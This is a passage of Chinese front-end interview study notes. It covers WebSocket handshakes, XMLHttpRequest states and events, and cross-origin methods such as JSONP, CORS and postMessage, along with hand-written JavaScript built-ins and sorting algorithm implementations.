- 更好的压缩效果。Websocket 在适当的扩展支持下，可以沿用之前内容的上下文，在传递类似的数据时，可以显著地提高压缩率；

### ✔ Websocket 建立连接的过程

ref

- [WebSocket 探秘](https://juejin.im/post/5a1bdf676fb9a045055dd99d)

WebSocket 是独立的、创建在 TCP 上的协议。Websocket 通过 HTTP/1.1 协议的 101 状态码进行握手。为了创建 Websocket 连接，需要通过浏览器发出请求，之后服务器进行回应，这个过程通常称为“握手”（Handshaking）。

一个典型的 Websocket 握手请求如下：

客户端请求：

```http
GET ws://localhost:3344/ HTTP/1.1
Host: localhost:3344
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Upgrade: websocket
Origin: http://localhost:5000
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7
Sec-WebSocket-Key: 8UDwnI/irW3PcoG8n8SGbQ==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
Sec-WebSocket-Protocol: ws
```

服务器回应：

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: amISaWB8bz9W/ynjGG1IQk1f0c8=
Sec-WebSocket-Protocol: ws
```

**字段说明**

- `Connection` 必须设置 `Upgrade`，表示客户端希望连接升级；
- `Upgrade` 字段必须设置 `Websocket`，表示希望升级到 Websocket 协议；
- `Sec-WebSocket-Key` 是随机的字符串，服务器端会用这些数据来构造出一个 SHA-1 的信息摘要。把`Sec-WebSocket-Key`加上一个特殊字符串“258EAFA5-E914-47DA-95CA-C5AB0DC85B11”，然后计算 SHA-1 摘要，之后进行 Base64 编码，将结果做为`Sec-WebSocket-Accept`头的值，返回给客户端。如此操作，可以尽量避免普通 HTTP 请求被误认为 Websocket 协议;
- `Sec-WebSocket-Extensions` 让服务端使用的扩展；
- `Sec-WebSocket-Protocol` 指定一个或者多个想要使用的 Websocket 协议；
- `Sec-WebSocket-Accept` 用以告知服务器愿发起一个 websocket 连接；
- `Sec-WebSocket-Version` 表示支持的 Websocket 版本。RFC6455 要求使用的版本是 `13`，之前草案的版本均应当弃用；

### ✔ 简单地实现 WebSocket 通信

前端页面

```html
<script>
  const ws = new WebSocket('ws://localhost:3344', 'ws')
  ws.onopen = () => {
    ws.send('hello server')
  }
  ws.onmessage = e => {
    console.log('message ', e.data)
  }
</script>
```

`app.js`

```js
const WebSocket = require('ws')
const wss = new WebSocket.Server({
  port: 3344,
})

wss.on('connection', function (ws) {
  console.log('connection')
  ws.on('message', function (data) {
    console.log('message')
    console.log(data)
    ws.send('hello client')
    ws.send(JSON.stringify({ name: 'lxfriday' }))
  })
})
console.log('ws listenning 3344')
```

## ✔ XMLHttpRequest

### ✔ readyState

`readyState` 共有 5 种状态

| 值  | 状态               | 描述                                             |
| :-- | :----------------- | :----------------------------------------------- |
| 0   | `UNSENT`           | `xhr` 被创建，但没有调用`open()` 方法            |
| 1   | `OPENED`           | `open()`方法已经被调用                           |
| 2   | `HEADERS_RECEIVED` | `send()`方法已经被调用，并且头部和状态已经可获得 |
| 3   | `LOADING`          | 下载中， `responseText` 属性已经包含部分数据     |
| 4   | `DONE`             | 下载操作已完成                                   |

```javascript
const codeMap = {
  0: 'UNSENT',
  1: 'OPENED',
  2: 'HEADERS_RECEIVED',
  3: 'LOADING',
  4: 'DONE',
}
const xhr = new XMLHttpRequest()
console.log('1', codeMap[xhr.readyState])
xhr.open('GET', '/', true)
console.log('2', codeMap[xhr.readyState])
xhr.setRequestHeader('accept', 'text/html')
xhr.responseType = 'text'
xhr.onprogress = function () {
  console.log('onprogress', codeMap[xhr.readyState])
  // console.log('responseText', xhr.responseText) // 已经有部分 response
}
xhr.onload = function () {
  console.log('onload', codeMap[xhr.readyState])
}
xhr.onreadystatechange = function () {
  console.log('onreadystatechange', codeMap[xhr.readyState])
}
xhr.send()
console.log('3', codeMap[xhr.readyState])
```

会打印下面的内容

```
1 UNSENT
2 OPENED
3 OPENED
onreadystatechange HEADERS_RECEIVED
onreadystatechange LOADING
onprogress LOADING
onreadystatechange LOADING
onprogress LOADING
onreadystatechange DONE
onload DONE
```

### ✔ responseType

`xhr.responseType` 用来指定 `xhr.response` 的类型。

| 值               | `xhr.response`数据类型 | 说明                                                            |
| :--------------- | :--------------------- | :-------------------------------------------------------------- |
| 空字符串或者不设 | 字符串                 | 将 `responseType` 设为空字符串与设置为`"text"`相同， 是默认类型 |
| `text`           | 字符串                 |                                                                 |
| `document`       | `Document` 对象        | 希望返回 XML 格式数据时使用                                     |
| `json`           | JSON                   |                                                                 |
| `blob`           | `Blob` 对象            |                                                                 |
| `arraybuffer`    | `ArrayBuffer` 对象     |                                                                 |

### ✔ 事件

ref [https://segmentfault.com/a/1190000004322487](https://segmentfault.com/a/1190000004322487)

| 事件                 | 触发条件                                                                                                                                                                                                                                                                                                                                                                                                                      |
| :------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `onreadystatechange` | 每当 `xhr.readyState` 改变时触发                                                                                                                                                                                                                                                                                                                                                                                              |
| `onloadstart`        | 调用 `xhr.send()`方法后立即触发，若 `xhr.send()`未被调用则不会触发此事件。此时 `readyState` 为 1(`OPENED`)                                                                                                                                                                                                                                                                                                                    |
| `onprogress`         | `xhr.upload.onprogress` 在上传阶段(即 `xhr.send()`之后，`xhr.readystate=2` 之前)触发，每 50ms 触发一次；`xhr.onprogress` 在下载阶段（即 `xhr.readystate=3` 时）触发，每 50ms 触发一次。                                                                                                                                                                                                                                       |
| `onload`             | 当请求成功完成时触发，此时 `xhr.readystate=4`                                                                                                                                                                                                                                                                                                                                                                                 |
| `onloadend`          | 当请求结束（包括请求成功和请求失败）时触发                                                                                                                                                                                                                                                                                                                                                                                    |
| `onabort`            | 当调用 `xhr.abort()` 后触发                                                                                                                                                                                                                                                                                                                                                                                                   |
| `ontimeout`          | `xhr.timeout` 不等于 0，由请求开始即 `onloadstart` 开始算起，当到达 `xhr.timeout` 所设置时间请求还未结束即 `onloadend`，则触发此事件。                                                                                                                                                                                                                                                                                        |
| `onerror`            | 在请求过程中，若发生 `Network error` 则会触发此事件（若发生 `Network error` 时，上传还没有结束，则会先触发 `xhr.upload.onerror`，再触发`xhr.onerror`；若发生 `Network error` 时，上传已经结束，则只会触发 `xhr.onerror`）。注意，只有发生了网络层级别的异常才会触发此事件，对于应用层级别的异常，如响应返回的 `xhr.statusCode` 是 `4xx` 时，并不属于 `Network error`，所以不会触发 `onerror` 事件，而是会触发 `onload` 事件。 |

## DNS

### DNS 解析过程

# CDN

# 性能优化

## 打开一个 URL 到页面显示发生哪些事情

ref

- [https://zhuanlan.zhihu.com/p/34453198](https://zhuanlan.zhihu.com/p/34453198)

## 前端性能优化最佳实践

ref

- [https://csspod.com/frontend-performance-best-practices/](https://csspod.com/frontend-performance-best-practices/)

# 浏览器及安全

## async、defer 的区别及应用

## ✔ 跨域

跨域是因为浏览器同源策略的存在而产生的，它可以提升网站的安全性。

同源：**协议 + 域名 + 端口完全相同则为同源**，即使两个不同的域名指向同一个 IP 这也算跨域。

同源策略限制的内容：

1. Cookie、LocalStorage、IndexedDB
1. Ajax 请求

额外允许跨域的标签，都是资源型标签：

1. `img`
1. `link`
1. `script`

对于 Ajax 请求，跨域请求是可以发送出去的，只是浏览器检测到不符合安全性要求，不允许 xhr 回调接受数据，并且会触发 `xhr.onerror` 事件。

### ✔ JSONP

原理：利用 `script` 标签没有跨域限制，网页可以得到从其他来源动态产生的 JSON 数据。

优点：兼容性好。

缺点：只能使用 GET 方式发请求，可能会遭受 XSS 攻击。

实现流程：

1. 前端声明一个待调用的函数 `show`
1. 创建 `script` 标签，设置其 `src` 为 `https://xxx.yy?cb=show`，并把标签添加到 DOM 中；
1. 服务端接受请求之后，获取到 `cb=show`；
1. 服务端把要传递的数据作为 show 的参数整体返回，`show(data)`；
1. 前端 `script` 接收导 `show` 函数的调用，执行 `show()` 函数；

```javascript
// index.html
function jsonp({ url, params, cb }) {
  return new Promise((resolve, reject) => {
    let script = document.createElement('script')
    // 把要执行的函数名传递到服务端，服务端回传一个对该函数的调用（同时附带需要处理的参数）
    window[cb] = function (data) {
      resolve(data)
      document.body.removeChild(script)
    }
    params = { ...params, cb }
    let arrs = []
    // 拼接成 name=lxfriday&cb=show
    for (let key in params) {
      arrs.push(`${key}=${params[key]}`)
    }
    script.src = `${url}?${arrs.join('&')}`
    document.body.appendChild(script)
  })
}
jsonp({
  url: 'http://localhost:3333/api',
  params: { name: 'lxfriday' },
  cb: 'show',
}).then(data => {
  // 打印 lxfriday
  console.log(data)
})
```

```javascript
// server.js
const url = require('url')
const http = require('http')

const app = http.createServer((req, res) => {
  const urlObj = url.parse(req.url)
  console.log('urlObj', urlObj)
  const query = {}
  urlObj.query.split('&').forEach(v => {
    const [key, value] = v.split('=')
    query[key] = value
  })
  // query { name: 'lxfriday', cb: 'show' }
  console.log('query', query)
  // 服务端返回 show('a cat ')，这样浏览器就会执行在浏览器中注册的函数
  res.end(`${query.cb}('${query.name}')`)
})
app.listen(3333)
console.log('listening')
```

### ✔ CORS

ref

- [http://www.ruanyifeng.com/blog/2016/04/cors.html](http://www.ruanyifeng.com/blog/2016/04/cors.html)

CORS 是一个 W3C 标准，全称是"跨域资源共享"（Cross-origin resource sharing）。

CORS 分为简单请求和非简单请求。

简单请求的特征：

```http
(1) 请求方法是以下三种方法之一：

HEAD
GET
POST

(2) HTTP的头信息不超出以下几种字段：

Accept
Accept-Language
Content-Language
Last-Event-ID
Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain
```

如果是简单请求，则和正常的请求一样只会发送一次。如果是非简单请求，则需要先发送一个请求方法为 OPTIONS 的请求，等服务端返回允许跨域的标识之后再进行真正的 POST 请求。

CORS 请求中服务端返回的允许跨域标识：

1. `Access-Control-Allow-Origin` 允许跨域的源，该字段是必须的。它的值要么是请求时 Origin 字段的值，要么是一个 `*`，表示接受任意域名的请求；
1. `Access-Control-Allow-Methods` 允许的请求方法；
1. `Access-Control-Allow-Credentials` 是否允许携带 cookie，其值为 `true` 表示允许，不设置这个字段表示不允许。如果是允许，则 `xhr.withCredentials` 必须为 `true`，并且 `Access-Control-Allow-Origin` 不能为 `*`；
1. `Access-Control-Allow-Headers` 允许客户端携带的请求头，使用简单请求之外的 header 时需要设置，Content-Type 为简单请求之外的其他字段时也需要设置这个返回头，以允许携带 `Content-Type`；
1. `Access-Control-Expose-Headers` 允许客户端通过 `xhr.getAllResponseHeaders()` 或者 `xhr.getResponseHeader()` 获取的返回头。不设置时允许访问 `Cache-Control` 、`Expires`、`Last-Modified`、`Pragma`、`Content-Language`、`Content-Length`、`Content-Type`；
1. `Access-Control-Max-Age` OPTIONS 预检请求在客户端缓存的时间，单位为秒。在缓存时间内再次请求相同域名则会不需要预检请求。

CORS 请求中客户端发送的跨域请求头：

1. `Access-Control-Request-Method` 跨域请求时客户端的请求方法，在预检请求中，该请求头会携带跨域请求的实际请求方法，如果该请求方法不在 `Access-Control-Allow-Methods` 允许的范围中则会报错；
1. `Access-Control-Request-Headers` 预检请求中客户端发送的除简单请求允许的 header 之外的其他 header，需要能匹配上服务器返回的 `Access-Control-Allow-Headers`；

注意：OPTIONS 预检请求和跨域 GET(POST) 请求是分开的两次请求，OPTIONS 只是为了验证服务器是否允许跨域，而预检请求之后的 GET(POST) 请求是逻辑请求，服务端的返回头中必须一致带着允许跨域的标识。

### ✔ WebSocket 跨域

WebSocket 和 HTTP 都是应用层协议，都基于 TCP 协议。但是 WebSocket 是一种双向通信协议，在建立连接之后，WebSocket 的 server 与 client 都能主动向对方发送或接收数据。同时，WebSocket 在建立连接时需要借助 HTTP 协议，连接建立好了之后 client 与 server 之间的双向通信就与 HTTP 无关了。

服务端

```javascript
// app.js
const WebSocket = require('ws')
const wss = new WebSocket.Server({
  port: 3344,
})

wss.on('connection', function (ws) {
  console.log('connection')
  ws.on('message', function (data) {
    console.log('message')
    console.log(data)
    ws.send('hello client')
    ws.send(JSON.stringify({ name: 'lxfriday' }))
  })
})
console.log('ws listenning 3344')

// ws listenning 3344
// connection
// message
// hello server
```

页面

```html
<script>
  const ws = new WebSocket('ws://localhost:3344')
  ws.onopen = () => {
    ws.send('hello server')
  }
  ws.onmessage = e => {
    console.log('message ', e.data)
  }

  // message  hello client
  // message  {"name":"lxfriday"}
</script>
```

### ✔ postMessage 跨域

ref

- [MDN postMessage](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage)

`window.postMessage()` 方法可以安全地实现跨源通信，它提供了一种受控机制来规避同源限制。

```javascript
otherWindow.postMessage(message, targetOrigin, [transfer])
```

- `otherWindow` 其他窗口的一个引用，比如 `iframe` 的 `contentWindow` 属性、执行 `window.open` 返回的窗口对象；
- `message` 将要发送到其他 window 的数据。它将会被[结构化克隆算法](https://developer.mozilla.org/en-US/docs/DOM/The_structured_clone_algorithm)序列化；
- `targetOrigin` 通过窗口的 `origin` 属性来指定哪些窗口能接收到消息事件，其值可以是字符串 `*`（表示无限制）或者一个 URI。如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配 `targetOrigin` 提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送；

- `transfer` 是一串和 `message` 同时传递的 `Transferable` 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。

在 a.html 页面中用 iframe 加载 b.html，并对 b.html 发送数据，然后 b.html 回传数据给 a.html。打印的结果如下

```
b :: e.origin http://localhost:5000
b :: e.data {name: "a.html", msg: "hello b"}
a :: e.origin http://localhost:5000
a :: e.data hello, I am b
```

a.html

```html
<body>
  a
  <iframe id="iframe" src="http://localhost:5000/b.html" onload="load()"></iframe>
  <script>
    function load() {
      const bUrl = 'http://localhost:5000/b.html'
      const b = document.querySelector('#iframe')
      function receiveMessage(e) {
        console.log('a :: e.origin', e.origin)
        console.log('a :: e.data', e.data)
      }
      window.addEventListener('message', receiveMessage)
      b.contentWindow.postMessage(
        {
          name: 'a.html',
          msg: 'hello b',
        },
        bUrl
      )
    }
  </script>
</body>
```

b.html

```html
<body>
  b
  <script>
    function receiveMessage(e) {
      console.log('b :: e.origin', e.origin)
      console.log('b :: e.data', e.data) // e.data 接收到一个对象
      e.source.postMessage('hello, I am b', e.origin)
    }
    window.addEventListener('message', receiveMessage)
  </script>
</body>
```

### ✔ 中间层代理跨域

![代理跨域](https://qiniu1.lxfriday.xyz/feoffer/cross-origin-proxy.png)

使用 Nginx 或者自建代理服务，让前端页面请求自己的代理服务器，由代理服务器把原请求转发到目标地址。

跨域限制只在浏览器层面才会有，浏览器向代理服务器发送请求时就可以规避掉原始 url 无法跨域的问题。

## XSS

## CSRF

ref

- [https://juejin.im/post/5b6b08956fb9a04fc67c2263](https://juejin.im/post/5b6b08956fb9a04fc67c2263)

## Chrome 架构

## 页面渲染流程

## 分层及合成机制

## 火焰图

## 预加载和懒加载

## prefetch 和 preload

## onload 和 DOMContentLoaded 的区别和顺序

## pwa

ref

- [docsify demo](https://docsify.js.org/#/pwa)

## 浏览器原理

### CSS 渲染、合成

# 手撕代码

## 手撕 JS 实现

### ✔ 手撕 instanceof

ref

- [https://juejin.im/post/5e05d56be51d4557e87fe365#heading-0](https://juejin.im/post/5e05d56be51d4557e87fe365#heading-0)

`instanceof` 运算符用于检测构造函数的 `prototype` 属性是否出现在某个实例对象的原型链上。

```javascript
function simulateInstanceOf(left, right) {
  if (right === null || right === undefined) {
    throw new TypeError(`Right-hand side of ' instanceof ' is not an object`)
  }
  const rightPrototype = right.prototype
  left = Object.getPrototypeOf(left)

  while (left !== null) {
    if (left === rightPrototype) return true
    left = Object.getPrototypeOf(left)
  }

  return false
}
```

### ✔ 手撕 call

```javascript
Function.prototype.call = function (ctx, ...args) {
  ctx = ctx || window
  const that = this
  const funcName = Symbol('func')
  ctx[funcName] = that
  const res = ctx[funcName](...args)
  delete ctx[funcName]
  return res
}
```

### ✔ 手撕 apply

```javascript
Function.prototype.apply = function (ctx, args) {
  ctx = ctx || window
  const that = this
  const funcName = Symbol('func')
  ctx[funcName] = that
  const res = ctx[funcName](...args)
  delete ctx[funcName]
  return res
}
```

### ✔ 手撕 bind

```javascript
Function.prototype.bind = function (ctx, ...args) {
  ctx = ctx || window
  const that = this
  const funcName = Symbol('func')
  ctx[funcName] = that
  return function (...args1) {
    return ctx[funcName](...args, ...args1)
  }
}
```

### ✔ 手撕 new

`new` 操作符创建对象的时候会做下面几件事情：

1. 创建一个新对象；
1. 将这个对象的 `__proto__` 属性指向构造函数的 `prototype` 属性；
1. 将构造函数的上下文指向这个新对象；
1. 执行构造函数中的代码；
1. 如果有 `return` 且返回一个对象（非 `null`），则返回 `return` 的对象，否则返回步骤一中创建的新对象；

```javascript
function myNew(Constructor, ...args) {
  if (!Constructor.prototype) {
    throw new TypeError('Constructor 不是一个构造函数')
  }
  const newObj = {}
  Object.setPrototypeOf(newObj, Constructor.prototype)
  const res = Constructor.apply(newObj, args)
  if (typeof res === 'object' && res !== null) return res
  else return newObj
}
```

### ✔ 手撕 Object.create

`Object.create` 以一个对象为原型创建一个新对象，并给其添加属性。

```javascript
function ObjectCreate(proto, propertiesObject) {
  const o = {}
  // proto 只能为 null 或者 type 为 object 的数据类型
  if (!(proto === null || typeof proto === 'object')) {
    throw new TypeError('Object prototype may only be an Object or null')
  }

  Object.setPrototypeOf(o, proto)

  if (propertiesObject === null) {
    throw new TypeError('Cannot convert undefined or null to object')
  }
  if (propertiesObject) Object.defineProperties(o, propertiesObject)
  return o
}
```

### ✔ 手撕 Object.assign

```javascript
function ObjectAssign(target, ...args) {
  if (target === null || target === undefined) {
    throw new Error('target 不能为 null 或者 undefined')
  }

  for (let index = 0; index < args.length; index++) {
    const source = args[index]

    if ((typeof source === 'object' || typeof source === 'string') && source !== null) {
      for (const key in source) {
        if (source.hasOwnProperty(key)) {
          target[key] = source[key]
        }
      }
    }
  }

  return target
}
```

### 手撕 Promise

ref

- [https://juejin.im/post/5b2f02cd5188252b937548ab](https://juejin.im/post/5b2f02cd5188252b937548ab)

### 手撕 JSON.stringify

### 手撕 EventEmitter

### 深拷贝

## 手撕 DOM 操作

### 实现一个输入框节流防抖并带有 autocomplete 能力

### 手写实现拖放功能

### 从一个字符串中提取时间

`2020-02-08 12:13:14` 提取成 => `[2020, 02, 08, 12, 13, 14]`

# 设计模式

# 数据结构

## 堆

## 栈

## 队列

### 优先队列

## 二叉树

# 算法

## 排序算法

![排序算法一览](https://qiniu1.lxfriday.xyz/feoffer/sort.png)

### 冒泡排序

![](https://qiniu1.lxfriday.xyz/feoffer/bubbleSort.png)

```typescript
function swap(arr: number[], a: number, b: number) {
  const tmp: number = arr[a]
  arr[a] = arr[b]
  arr[b] = tmp
}

export function bubbleSort(arr: number[]) {
  const length = arr.length
  if (length <= 1) return arr
  for (let i = 0; i < length; i++) {
    let changed: boolean = false // 没有数据交换则表示已经有序了
    for (let j = 0; j < length - 1 - i; j++) {
      if (arr[j] > arr[j + 1]) {
        swap(arr, j, j + 1)
        changed = true
      }
    }
    if (!changed) break
  }
  return arr
}
```

### 鸡尾酒排序

### 选择排序

### 插入排序

### 归并排序

### 快速排序

### ✔ 堆排序(heap-sort)

![堆排序](https://qiniu1.lxfriday.xyz/feoffer/heapSort2.png)
![堆排序](https://qiniu1.lxfriday.xyz/feoffer/heapSort.gif)

堆(Heap)是计算机科学中一类特殊的数据结构的统称。堆通常是一个可以被看做一棵完全二叉树的数组对象。其中每个节点最多存在两个子节点，对以 0 开始的堆数组，有如下规则：

1. 父节点 `i` 的**左**子节点在位置 `2 * i + 1`
1. 父节点 `i` 的**右**子节点在位置 `2 * i + 2`
1. 子节点 `i` 的父节点在位置 `Math.floor((i -1) / 2)`

大顶堆：所有节点 `i` 的值比其左右子节点都大的堆
小顶堆：所有节点 `i` 的值比其左右子节点都小的堆

堆排序的重要过程（以大顶堆实现从小到大为例）：

1. 构建大顶堆
1. 把 0 和最后一位交换（无序数组的最后一位）
1. 从 0 位重新构建大顶堆
1. 重复步骤 2、3

```javascript
function swap(arr, i, j) {
  ;[arr[i], arr[j]] = [arr[j], arr[i]]
}
// 构建大顶堆的核心递归算法
function heapifyMax(arr, i, len) {
  const left = 2 * i + 1
  const right = 2 * i + 2
  let max = i
  if (left < len && arr[left] > arr[max]) {
    max = left
  }
  if (right < len && arr[right] > arr[max]) {
    max = right
  }
  if (i != max) {
    swap(arr, max, i)
    heapifyMax(arr, max, len)
  }
}
// 构建小顶堆的核心递归算法
function heapifyMin(arr, i, len) {
  const left = 2 * i + 1
  const right = 2 * i + 2
  let min = i
  if (left < len && arr[left] < arr[min]) {
    min = left
  }
  if (right < len && arr[right] < arr[min]) {
    min = right
  }
  if (i != min) {
    swap(arr, min, i)
    heapifyMin(arr, min, len)
  }
}

function buildMaxHeap(arr) {
  const len = arr.length
  for (let i = Math.floor(len / 2); i >= 0; i--) {
    heapifyMax(arr, i, len)
  }
}

function buildMinHeap(arr) {
  const len = arr.length
  for (let i = Math.floor(len / 2); i >= 0; i--) {
    heapifyMin(arr, i, len)
  }
}

// asc 为 true 表示从小到大，false 为从大到小
function heapSort(arr, asc = false) {
  if (asc) {
    // 使用大顶堆实现从小到大排序
    buildMaxHeap(arr)
    const len = arr.length
    for (let i = len - 1; i > 0; i--) {
      swap(arr, 0, i)
      heapifyMax(arr, 0, i)
    }
  } else {
    // 使用小顶堆实现从大到小排序
    buildMinHeap(arr)
    const len = arr.length
    for (let i = len - 1; i > 0; i--) {
      swap(arr, 0, i)
      heapifyMin(arr, 0, i)
    }
  }
  return arr
}
```

### ✔ 计数排序(counting-sort)

![计数排序](https://qiniu1.lxfriday.xyz/feoffer/countingSort.png)

**限定为非负数**

计数排序是一种稳定的线性时间排序算法。计数排序使用一个额外的数组 `C` ，其中第 `i` 个元素是待排序数组 `A` 中值等于 `i` 的元素的个数。然后根据数组 `C` 来将 `A` 中的元素排到正确的位置。

当输入的元素是 `n` 个 `0` 到 `k` 之间的整数时，它的运行时间是 `t(n+k)`。**计数排序不是比较排序，排序的速度快于任何比较排序算法。**

由于用来计数的数组 `C` 的长度取决于待排序数组中数据的范围（等于待排序数组的最大值与最小值的差加上 1），这使得计数排序对于数据范围很大的数组，需要大量时间和内存。

```javascript
function countingSort(arr) {
  const len = arr.length
  if (len < 2) return arr
  const bucket = []
  let sortIndex = 0

  for (let i = 0; i < len; i++) {
    if (bucket[arr[i]]) {
      bucket[arr[i]] += 1
    } else {
      bucket[arr[i]] = 1
    }
  }

  for (let i = 0; i < bucket.length; i++) {
    for (let j = bucket[i]; j > 0; j--) {
      arr[sortIndex++] = i
    }
  }
  return arr
}
```

### ✔ 基数排序(radix-sort)

![基数排序](https://qiniu1.lxfriday.xyz/feoffer/radixSort.png)

**限定为非负数**

基数排序原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。

它是这样实现的：将所有待比较数值（正整数）统一为同样的数字长度，数字较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后，数列就变成一个有序序列。

基数排序的方式可以采用 **LSD（Least significant digital）** 或 **MSD（Most significant digital）**，LSD 的排序方式由键值的最右边开始，而 MSD 则相反，由键值的最左边开始。

基数排序的时间复杂度是 `O(k*n)`，其中 `n` 是排序元素个数，`k` 是数字位数。这不是说这个时间复杂度一定优于 `O(nlogn)`，`k` 的大小取决于数字位的选择（比如比特位数），和待排序数据所属数据类型的全集的大小；`k` 决定了进行多少轮处理，而 `n` 是每轮处理的操作数目。

LSD 实现

```javascript
function radixSort(arr) {
  const len = arr.length
  // 得到最大值
  const max = Math.max(...arr)
  let bucket = []
  // 获取最大值的位数
  let digit = `${max}`.length
  let start = 1
  // 待操作的新数组
  let res = arr.slice()

  while (digit > 0) {
    // 每轮向左移动一位
    start *= 10
    for (let i = 0; i < len; i++) {
      const j = res[i] % start
      // 和计数排序类似
      if (!bucket[j]) {
        bucket[j] = []
      }
      // bucket 是一个二维数组
      bucket[j].push(res[i])
    }

    // 拼接前 res 设为空数组
    res = []
    for (let i = 0; i < bucket.length; i++) {
      if (bucket[i] !== undefined) {
        // res 拼接 bucket[i] 数组
        res = res.concat(bucket[i])
      }
    }
    // 结束之后 bucket 重置
    bucket = []
    digit--
  }

  return res
}
```

### ✔ 桶排序、箱排序(bucket-sort)

![桶排序](https://qiniu1.lxfriday.xyz/feoffer/bucketSort.png)

桶排序工作原理是将数组分到有限数量的桶里，每个桶再个别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排序）。

桶排序以下列步骤进行：

1. 设置桶个数 `size`，计算每个桶的存储范围；
1. 遍历数组，把数字放到对应的桶中；
1. 对步骤 2 放新数字的桶数组排序；
1. 数组遍历完之后，把桶中的数字依次取出放到最终的数组中；

```javascript
function swap(arr, i, j) {
  ;[arr[i], arr[j]] = [arr[j], arr[i]]
}

/**
 * @param {array} arr 待排序的数组
 * @param {number} size 桶的个数
 */
function bucketSort(arr, size = 5) {
  const len = arr.length
  // 取到最小值
  const min = Math.min(...arr)
  // 取得最大值
  const max = Math.max(...arr)
  // 每个桶的范围
  const bucketSize = Math.floor((max - min) / size) + 1
  const res = []
  // 总共的桶容器
  const bucket = []

  for (let i = 0; i < len; i++) {
    // arr[i] 分布在桶 j
    const j = Math.floor((arr[i] - min) / bucketSize)

    // 桶不存在则创建
    if (bucket[j] === undefined) {
      bucket[j] = []
    }
    // 将 arr[i] 推入桶中
    bucket[j].push(arr[i])
    let l = bucket[j].length - 1
    while (l > 0) {
      // 对个别桶使用冒泡
      // 若 arr[i] 在桶内不是最小，则向前移动
      bucket[j][l] < bucket[j][l - 1] && swap(bucket[j], l, l - 1)
      l--
    }
  }

  // 把 bucket 二维数组中的数据全部拿出来
  for (let i = 0; i < bucket.length; i++) {
    if (bucket[i] !== undefined) {
      for (let j = 0; j < bucket[i].length; j++) {
        res.push(bucket[i][j])
      }
    }
  }
  return res
}
```

## LRU 缓存算法

## 斐波拉契数列累加
